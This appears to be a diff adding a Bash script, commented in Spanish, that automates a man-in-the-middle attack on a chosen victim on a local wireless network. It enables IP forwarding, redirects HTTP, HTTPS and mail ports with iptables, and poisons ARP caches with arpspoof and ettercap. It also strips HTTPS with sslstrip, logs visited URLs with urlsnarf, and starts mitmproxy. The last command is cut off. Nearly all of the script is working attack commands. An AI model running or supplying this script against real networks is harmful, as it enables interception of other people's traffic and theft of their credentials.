@@ -1,0 +1,30 @@
+#!/bin/bash
+#SCRIPT UNIFICADO, copiar en la carpeta root para ejecucion más facil.
+
+echo -e "Ingresar IP Router(GT):"
+read iprouter
+echo -e "Ingresar IP Victima:"
+read victima
+echo "1" > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -F
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8443
+iptables -t nat -A PREROUTING -p tcp --destination-port 587 -j REDIRECT --to-port 8443
+iptables -t nat -A PREROUTING -p tcp --destination-port 465 -j REDIRECT --to-port 8443
+echo -e "\e[1;34mIPTables- Iniciado\e[0m"
+xterm -geometry 75x15+1+300 -T "Inicia ataque ARP Spoof - No cerrar esta ventana" -e arpspoof -i wlan0 -t $victima $iprouter & 
+echo -e "\e[1;34mARP Spoof - Iniciado\e[0m"
+echo "1" > /proc/sys/net/ipv4/ip_forward
+sleep 2
+xterm -geometry 75x15+1+300 -T "Inicia ataque Ettercap - No cerrar esta ventana" -e ettercap -T -q -i wlan0 -M arp:remote /$victima/ /$iprouter/ > Espoof.txt &
+sleep 2
+echo -e "\e[1;34mEttercap - Iniciado\e[0m"
+xterm -geometry 75x15+500+300 -T "Sslstrip port:8080 - No cerrar esta ventana" -e sslstrip -w MICO_HTTP -l 8080 &
+sleep 2
+xterm -geometry 75x15+500+300 -T "Sslstrip port:8443 - No cerrar esta ventana" -e sslstrip -w MICO_ANEXO -l 8443 &
+echo -e "\e[1;34mSSL Strip - Iniciado\e[0m"
+sleep 2 
+xterm -geometry 75x15+500+300 -T "Urlsnarf - No cerrar esta ventana" -e urlsnarf -i wlan0 > URLSNARF_CAPTURA.txt &
+echo -e "\e[1;34mURLSNARF Iniciado\e[0m"
+sleep 2
+mitmproxy -T --host 
